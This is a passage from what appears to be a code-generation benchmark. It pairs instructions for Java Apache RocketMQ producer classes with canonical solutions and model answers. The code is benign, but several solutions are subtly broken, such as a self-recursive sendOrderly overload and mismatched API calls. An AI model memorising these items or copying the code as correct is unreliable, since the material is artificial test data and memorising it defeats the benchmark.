response = mHttpClient.send(request, BodyHandlers.ofString());\n            return \"Status: \" + response.statusCode() + \"\\nBody: \" + response.body();\n        } catch (IOException | InterruptedException e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        mHttpClient.sendAsync(request, BodyHandlers.ofString())\n                .thenApply(HttpResponse::body)\n                .thenAccept(body -> {\n                    System.out.println(\"Response received: \" + body);\n                })\n                .exceptionally(ex -> {\n                    System.err.println(\"Error occurred: \" + ex.getMessage());\n                    return null;\n                });\n    }\n}\n\nclass BroadcastifyCallConfiguration {\n    private final String apiKey;\n    private final String systemId;\n\n    public BroadcastifyCallConfiguration(String apiKey, String systemId) {\n        this.apiKey = apiKey;\n        this.systemId = systemId;\n    }\n\n    public String getApiKey() {\n        return apiKey;\n    }\n\n    public String getSystemId() {\n        return systemId;\n    }\n}\n```"
  },
  {
    "Task_id": 390,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic with a given tag. The class should handle producer initialization, message sending, and resource cleanup.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It manages the producer lifecycle (startup and shutdown) and provides a method to send messages to a RocketMQ broker.\n\nAttributes:\n- producer: DefaultMQProducer - The underlying RocketMQ producer instance that handles message sending operations\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes a new producer instance with the specified producer group and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- sendMessage: sendMessage(String topic, String tag, String messageBody) -> SendResult - Creates and sends a message to the specified topic with the given tag and body\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) throws MQClientException {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tag, String messageBody) throws Exception {\n        Message msg = new Message(topic, \n                                tag,\n                                messageBody.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tag, String messageBody) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tag, messageBody.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 391,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic with tags. The class should handle producer configuration, message sending, and resource cleanup.\n\nClass Description: The RocketMQProducer class encapsulates the functionality for creating and managing a RocketMQ message producer. It handles initialization, configuration, message sending, and shutdown of the producer instance.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The NameServer address for RocketMQ\n- LOGGER: Logger - Logger instance for logging producer activities\n\nMethods:\n- RocketMQProducer(String producerGroup, String namesrvAddr) -> None - Constructor that initializes the producer with a group name and NameServer address\n- configureProducer() -> None - Configures the producer with necessary settings including NameServer address and access channel\n- startProducer() -> None - Starts the producer instance and logs the startup\n- sendMessage(String topic, String tags, String messageBody) -> SendResult - Creates and sends a message to the specified topic with given tags and body, returns the send result\n- shutdownProducer() -> None - Shuts down the producer instance to release resources",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.client.AccessChannel;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\n\npublic class RocketMQProducer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RocketMQProducer.class);\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup, false, null);\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void configureProducer() {\n        producer.setAccessChannel(AccessChannel.CLOUD);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void startProducer() throws Exception {\n        producer.start();\n        LOGGER.info(\"Producer Started...\");\n    }\n\n    public SendResult sendMessage(String topic, String tags, String messageBody) throws Exception {\n        Message msg = new Message(\n            topic, \n            tags, \n            messageBody.getBytes(RemotingHelper.DEFAULT_CHARSET)\n        );\n        SendResult sendResult = producer.send(msg);\n        if (sendResult.getSendStatus() != SendStatus.SEND_OK) {\n            throw new Exception(\"Message sending failed\");\n        }\n        return sendResult;\n    }\n\n    public void shutdownProducer() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RocketMQProducer {\n    private final DefaultMQProducer producer;\n    private final String namesrvAddr;\n    private static final Logger LOGGER = LoggerFactory.getLogger(RocketMQProducer.class);\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.namesrvAddr = namesrvAddr;\n        configureProducer();\n    }\n\n    private void configureProducer() {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setInstanceName(\"RocketMQProducerInstance\");\n    }\n\n    public void startProducer() throws MQClientException {\n        producer.start();\n        LOGGER.info(\"RocketMQ producer started successfully.\");\n    }\n\n    public SendResult sendMessage(String topic, String tags, String messageBody) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags, messageBody.getBytes());\n        SendResult sendResult = producer.send(msg);\n        LOGGER.info(\"Message sent to topic: {}, tags: {}\", topic, tags);\n        return sendResult;\n    }\n\n    public void shutdownProducer() {\n        producer.shutdown();\n        LOGGER.info(\"RocketMQ producer shut down successfully.\");\n    }\n}\n```"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic, querying messages, and managing the producer lifecycle.\n\nClass Description: The TestProducer class provides functionality to initialize, start, and manage a RocketMQ producer instance. It can send messages to a specified topic with tags and keys, query messages based on criteria, and properly shut down the producer when no longer needed.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages and performing message-related operations.\n\nMethods:\n- TestProducer(String namesrvAddr, String producerGroup) -> void - Constructor that initializes the producer with the specified NameServer address and producer group.\n- start() -> void - Starts the producer instance to begin sending messages.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Sends a message to the specified topic with given tags, keys, and body. Returns the send result.\n- queryMessage(String topic, String key, int maxNum, long begin, long end) -> QueryResult - Queries messages for the specified topic based on key, maximum number of messages, and time range. Returns the query result.\n- shutdown() -> void - Shuts down the producer instance gracefully.",
    "Canonical_solution": "import org.apache.rocketmq.client.QueryResult;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class TestProducer {\n\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws Exception {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.tools.admin.DefaultMQAdminExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\npublic class TestProducer {\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags.getBytes(), keys.getBytes(), body.getBytes());\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws MQClientException, InterruptedException {\n        DefaultMQAdminExt admin = new DefaultMQAdminExt();\n        admin.setNamesrvAddr(producer.getNamesrvAddr());\n        admin.start();\n        try {\n            return admin.queryMessage(topic, key, maxNum, begin, end);\n        } finally {\n            admin.shutdown();\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Create a Java class that serves as a template for interacting with RocketMQ producers, providing various methods to send messages (including ordered messages) with configurable parameters.\n\nClass Description: The RocketMQTemplate class is a utility class that simplifies interaction with RocketMQ producers. It manages producer instances, provides default configurations, and offers multiple methods for sending messages with different levels of customization. The class handles both regular and ordered message sending, with configurable timeouts, queue numbers, and producer groups.\n\nAttributes:\n- log: [InternalLogger] - Logger instance for error and debug logging\n- DEFAULT_PRODUCER_GROUP: [String] - Default producer group name\n- DEFAULT_QUEUE_NUM: [int] - Default number of queues\n- DEFAULT_SEND_MSG_TIMEOUT: [int] - Default message sending timeout in milliseconds\n- producerMap: [Map<String, DefaultMQProducer>] - Map storing producer instances with their configuration keys\n\nMethods:\n- getProducer() -> [DefaultMQProducer] - Gets a producer with default settings\n- getProducer([int queueNum]) -> [DefaultMQProducer] - Gets a producer with custom queue number\n- getProducer([String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a producer with custom group and timeout\n- getProducer([int queueNum, String producerGroup, int sendMsgTimeout]) -> [DefaultMQProducer] - Gets a fully customized producer\n- send([String topic, String body]) -> [SendResult] - Sends a message with default settings\n- send([String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom timeout\n- send([String producerGroup, String topic, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with custom group and timeout\n- send([String producerGroup, String topic, String tags, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags\n- send([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends a message with tags and keys\n- send([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending messages\n- sendOrderly([String producerGroup, String topic, String keys, String body]) -> [SendResult] - Sends ordered message with default timeout\n- sendOrderly([String producerGroup, String topic, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with custom timeout\n- sendOrderly([String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout]) -> [SendResult] - Sends ordered message with tags\n- sendOrderly([String producerGroup, Message message, int sendMsgTimeout]) -> [SendResult] - Internal method for sending ordered messages",
    "Canonical_solution": "import org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.math.NumberUtils;\nimport org.apache.rocketmq.client.log.ClientLogger;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.InternalLogger;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RocketMQTemplate {\n\n    private static final InternalLogger log = ClientLogger.getLog();\n\n    private static final String DEFAULT_PRODUCER_GROUP = \"default-producer\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n\n    private static Map<String, DefaultMQProducer> producerMap = new HashMap<>();\n\n    public static DefaultMQProducer getProducer() throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum) throws Exception {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) throws Exception {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public static DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) throws Exception {\n        if (queueNum < 1) throw new IllegalArgumentException(\"queueNum must >= 1\");\n        if (StringUtils.isBlank(producerGroup)) throw new IllegalArgumentException(\"producerGroup cannot be null\");\n        String producerKey = producerGroup + queueNum;\n        if (producerMap.get(producerKey) == null) {\n            synchronized (producerMap) {\n                if (producerMap.get(producerKey) == null) {\n                    DefaultMQProducer producer = new DefaultMQProducer(DEFAULT_PRODUCER_GROUP);\n                    producer.setDefaultTopicQueueNums(queueNum);\n                    producer.setSendMsgTimeout(sendMsgTimeout);\n                    producer.start();\n                    producerMap.put(producerKey, producer);\n                }\n            }\n        }\n        return producerMap.get(producerKey);\n    }\n\n    public static SendResult send(String topic, String body) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult send(String topic, String body, int sendMsgTimeout) {\n        return send(DEFAULT_PRODUCER_GROUP, topic, body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) {\n        return send(producerGroup, topic, tags, \"\", body, sendMsgTimeout);\n    }\n\n    public static SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return send(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult send(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body) {\n        return sendOrderly(producerGroup, topic, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) {\n        return sendOrderly(producerGroup, topic, keys, body, sendMsgTimeout);\n    }\n\n    public static SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) {\n        try {\n            return sendOrderly(producerGroup, new Message(topic, tags, keys, body.getBytes(RemotingHelper.DEFAULT_CHARSET)), sendMsgTimeout);\n        } catch (Exception e) {\n            log.error(\"send error, producerGroup:{}, topic:{}, tags:{}, keys:{}, body:{}\",\n                    producerGroup, topic, tags, keys, body, e);\n            throw new MessagingException(e.getMessage(), e);\n        }\n    }\n\n    private static SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) throws Exception {\n        return getProducer(producerGroup, sendMsgTimeout).send(message,\n                new MessageQueueSelector() {\n                    @Override\n                    public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                        long id = NumberUtils.toLong(String.valueOf(arg));\n                        int index = (int) (id % mqs.size());\n                        return mqs.get(index);\n                    }\n                }, message.getKeys());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.logging.InternalLogger;\nimport org.apache.rocketmq.logging.InternalLoggerFactory;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class RocketMQTemplate {\n    private static final InternalLogger log = InternalLoggerFactory.getLogger(RocketMQTemplate.class);\n    private static final String DEFAULT_PRODUCER_GROUP = \"DEFAULT_PRODUCER_GROUP\";\n    private static final int DEFAULT_QUEUE_NUM = 4;\n    private static final int DEFAULT_SEND_MSG_TIMEOUT = 3000;\n    private final Map<String, DefaultMQProducer> producerMap = new ConcurrentHashMap<>();\n\n    public DefaultMQProducer getProducer() {\n        return getProducer(DEFAULT_QUEUE_NUM, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum) {\n        return getProducer(queueNum, DEFAULT_PRODUCER_GROUP, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public DefaultMQProducer getProducer(String producerGroup, int sendMsgTimeout) {\n        return getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n    }\n\n    public DefaultMQProducer getProducer(int queueNum, String producerGroup, int sendMsgTimeout) {\n        String key = producerGroup + \":\" + queueNum + \":\" + sendMsgTimeout;\n        if (producerMap.containsKey(key)) {\n            return producerMap.get(key);\n        }\n        synchronized (this) {\n            if (producerMap.containsKey(key)) {\n                return producerMap.get(key);\n            }\n            DefaultMQProducer producer = new DefaultMQProducer(producerGroup);\n            producer.setNamesrvAddr(\"localhost:9876\");\n            producer.setSendMsgTimeout(sendMsgTimeout);\n            try {\n                producer.start();\n                producerMap.put(key, producer);\n            } catch (MQClientException | InterruptedException e) {\n                log.error(\"Failed to start producer\", e);\n            }\n            return producer;\n        }\n    }\n\n    public SendResult send(String topic, String body) throws MQClientException, InterruptedException {\n        return send(topic, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult send(String topic, String body, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        return send(DEFAULT_PRODUCER_GROUP, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String body, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        return send(producerGroup, topic, null, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String body, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        return send(producerGroup, topic, tags, null, body, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags, keys == null ? \"\" : keys.getBytes(), body.getBytes());\n        return sendInternal(producerGroup, msg, sendMsgTimeout);\n    }\n\n    public SendResult send(String producerGroup, Message message, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        return sendInternal(producerGroup, message, sendMsgTimeout);\n    }\n\n    private SendResult sendInternal(String producerGroup, Message message, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n        return producer.send(message);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body) throws MQClientException, InterruptedException {\n        return sendOrderly(producerGroup, topic, null, keys, body, DEFAULT_SEND_MSG_TIMEOUT);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String keys, String body, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        return sendOrderly(producerGroup, topic, null, keys, body, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(String producerGroup, String topic, String tags, String keys, String body, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags, keys == null ? \"\" : keys.getBytes(), body.getBytes());\n        return sendOrderlyInternal(producerGroup, msg, sendMsgTimeout);\n    }\n\n    public SendResult sendOrderly(String producerGroup, Message message, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        return sendOrderlyInternal(producerGroup, message, sendMsgTimeout);\n    }\n\n    private SendResult sendOrderlyInternal(String producerGroup, Message message, int sendMsgTimeout) throws MQClientException, InterruptedException {\n        DefaultMQProducer producer = getProducer(DEFAULT_QUEUE_NUM, producerGroup, sendMsgTimeout);\n        return producer.send(message, (Message msg, Object arg) -> {\n            return 0;\n        }, null);\n    }\n}\n```"
  },
  {
    "Task_id": 394,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic with a given tag.\n\nClass Description: The RocketMQProducer class encapsulates the functionality to initialize, send messages, and shutdown a RocketMQ producer instance. It handles the connection to the RocketMQ NameServer and manages message production.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namespace: String - The namespace for the producer (V2 version)\n- producerGroup: String - The group name for the producer\n- namesrvAddr: String - The address of the NameServer\n- topic: String - The topic to which messages will be sent\n- tag: String - The tag for the messages\n\nMethods:\n- RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) -> None - Constructor that initializes the producer with the given parameters\n- initialize() -> void - Configures and starts the producer instance with the specified namespace and NameServer address\n- sendMessage(String messageContent) -> void - Creates and sends a message with the given content to the configured topic and tag\n- shutdown() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport java.nio.charset.StandardCharsets;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n    private String namespace;\n    private String producerGroup;\n    private String namesrvAddr;\n    private String topic;\n    private String tag;\n\n    public RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) {\n        this.namespace = namespace;\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n        this.topic = topic;\n        this.tag = tag;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void initialize() throws Exception {\n        producer.setNamespaceV2(namespace);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void sendMessage(String messageContent) throws Exception {\n        Message message = new Message(topic, tag, messageContent.getBytes(StandardCharsets.UTF_8));\n        producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namespace;\n    private String producerGroup;\n    private String namesrvAddr;\n    private String topic;\n    private String tag;\n\n    public RocketMQProducer(String namespace, String producerGroup, String namesrvAddr, String topic, String tag) {\n        this.namespace = namespace;\n        this.producerGroup = producerGroup;\n        this.namesrvAddr = namesrvAddr;\n        this.topic = topic;\n        this.tag = tag;\n    }\n\n    public void initialize() throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        if (namespace != null && !namespace.isEmpty()) {\n            producer.setNamespace(namespace);\n        }\n        producer.start();\n    }\n\n    public void sendMessage(String messageContent) throws MQClientException {\n        Message msg = new Message(topic, tag, messageContent.getBytes());\n        producer.send(msg);\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 395,
    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to specified topics with callback handling for success and failure cases.\n\nClass Description: RMQAsyncSendProducer is a RocketMQ asynchronous message producer that sends messages to a specified topic and handles responses through callbacks. It tracks successful sends and exceptions, and provides methods for waiting for responses and shutting down the producer.\n\nAttributes:\n- nsAddr: String - The NameServer address for RocketMQ\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- sendCallback: SendCallback - Callback handler for message send results\n- successSendResult: List<SendResult> - Thread-safe list of successful send results\n- exceptionMsgCount: AtomicInteger - Counter for messages that failed to send\n- msgSize: int - The number of messages to send\n- logger: Logger - SLF4J logger instance\n- topic: String - The topic to which messages will be sent (inherited from AbstractMQProducer)\n- msgBodys: [Data Structure] - Stores message bodies (inherited from AbstractMQProducer)\n- originMsgs: [Data Structure] - Stores original messages (inherited from AbstractMQProducer)\n\nMethods:\n- RMQAsyncSendProducer(String nsAddr, String topic) -> void - Constructor that initializes the producer with NameServer address and topic\n- create() -> void - Creates and configures the DefaultMQProducer instance\n- start() -> void - Starts the producer instance\n- asyncSend(Object msg) -> void - Asynchronously sends a single message\n- asyncSend(int msgSize) -> void - Asynchronously sends multiple messages (quantity specified by msgSize)\n- asyncSend(Object msg, MessageQueueSelector selector, Object arg) -> void - Asynchronously sends a message with queue selection\n- waitForResponse(int timeoutMills) -> void - Waits for all responses until timeout\n- shutdown() -> void - Shuts down the producer (overrides AbstractMQProducer method)",
    "Canonical_solution": "import java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.test.clientinterface.AbstractMQProducer;\nimport org.apache.rocketmq.test.sendresult.ResultWrapper;\nimport org.apache.rocketmq.test.util.RandomUtil;\nimport org.apache.rocketmq.test.util.TestUtil;\n\npublic class RMQAsyncSendProducer extends AbstractMQProducer {\n    private static Logger logger = LoggerFactory.getLogger(RMQAsyncSendProducer.class);\n    private String nsAddr = null;\n    private DefaultMQProducer producer = null;\n    private SendCallback sendCallback = null;\n    private List<SendResult> successSendResult = Collections.synchronizedList(new ArrayList<SendResult>());\n    private AtomicInteger exceptionMsgCount = new AtomicInteger(0);\n    private int msgSize = 0;\n\n    public RMQAsyncSendProducer(String nsAddr, String topic) {\n        super(topic);\n        this.nsAddr = nsAddr;\n        sendCallback = new SendCallback() {\n            @Override\n            public void onSuccess(SendResult sendResult) {\n                successSendResult.add(sendResult);\n            }\n            @Override\n            public void onException(Throwable throwable) {\n                exceptionMsgCount.getAndIncrement();\n            }\n        };\n        create();\n        start();\n    }\n\n    private void create() {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(RandomUtil.getStringByUUID());\n        producer.setInstanceName(RandomUtil.getStringByUUID());\n        if (nsAddr != null) {\n            producer.setNamesrvAddr(nsAddr);\n        }\n    }\n\n    private void start() {\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            logger.error(\"producer start failed!\");\n            e.printStackTrace();\n        }\n    }\n\n    public void asyncSend(Object msg) {\n        Message metaqMsg = (Message) msg;\n        try {\n            producer.send(metaqMsg, sendCallback);\n            msgBodys.addData(new String(metaqMsg.getBody(), StandardCharsets.UTF_8));\n            originMsgs.addData(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void asyncSend(int msgSize) {\n        this.msgSize = msgSize;\n        for (int i = 0; i < msgSize; i++) {\n            Message msg = new Message(topic, RandomUtil.getStringByUUID().getBytes(StandardCharsets.UTF_8));\n            this.asyncSend(msg);\n        }\n    }\n\n    public void asyncSend(Object msg, MessageQueueSelector selector, Object arg) {\n        Message metaqMsg = (Message) msg;\n        try {\n            producer.send(metaqMsg, selector, arg, sendCallback);\n            msgBodys.addData(new String(metaqMsg.getBody(), StandardCharsets.UTF_8));\n            originMsgs.addData(msg);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void waitForResponse(int timeoutMills) {\n        long startTime = System.currentTimeMillis();\n        while (this.successSendResult.size() != this.msgSize) {\n            if (System.currentTimeMillis() - startTime < timeoutMills) {\n                TestUtil.waitForMonment(100);\n            } else {\n                logger.info(\"timeout but still not recv all response!\");\n                